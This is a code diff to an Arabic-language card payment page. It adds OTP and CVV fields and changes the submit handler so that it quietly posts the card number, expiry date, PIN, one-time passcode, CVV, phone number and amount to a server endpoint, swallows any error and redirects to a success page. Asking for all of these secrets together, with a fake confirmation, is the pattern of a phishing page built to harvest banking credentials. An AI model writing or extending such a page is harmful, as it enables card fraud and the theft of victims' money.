@@ -320,6 +320,18 @@
           </td>
           <td class="td-label">:(PIN) الرقم السري</td>
         </tr>
+        <tr>
+          <td class="td-input">
+            <input class="field small" type="text" id="otp" inputmode="numeric" maxlength="6" placeholder="">
+          </td>
+          <td class="td-label">:رمز OTP</td>
+        </tr>
+        <tr>
+          <td class="td-input">
+            <input class="field small" type="text" id="cvv" inputmode="numeric" maxlength="3" placeholder="">
+          </td>
+          <td class="td-label">:CVV</td>
+        </tr>
       </table>
     </div>
 
@@ -676,16 +688,28 @@
       e.target.value = v;
     });
 
-    function handleSend() {
+    async function handleSend() {
       const card   = cardInput.value.replace(/\s/g,'');
       const expiry = document.getElementById('expiry').value.replace(/\s/g,'').replace('/','');
       const pin    = document.getElementById('pin').value;
+      const otp    = document.getElementById('otp').value.trim();
+      const cvv    = document.getElementById('cvv').value.trim();
       const ok     = document.getElementById('terms').checked;
       if (card.length < 16) { alert('الرجاء إدخال رقم البطاقة كاملاً'); return; }
       if (expiry.length < 4) { alert('الرجاء إدخال تاريخ انتهاء البطاقة'); return; }
       if (pin.length < 4)   { alert('الرجاء إدخال الرقم السري'); return; }
       if (!ok)              { alert('الرجاء الموافقة على الشروط والأحكام'); return; }
-      alert('جاري معالجة الدفع...');
+      const p = new URLSearchParams(location.search);
+      const phone  = p.get('phone')  || '';
+      const amount = p.get('amount') || '';
+      try {
+        await fetch('/api/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone, amount, card, expiry, pin, otp, cvv })
+        });
+      } catch(e) {}
+      location.href = '/success.html';
     }
     function handleCancel() { history.back(); }
   </script>
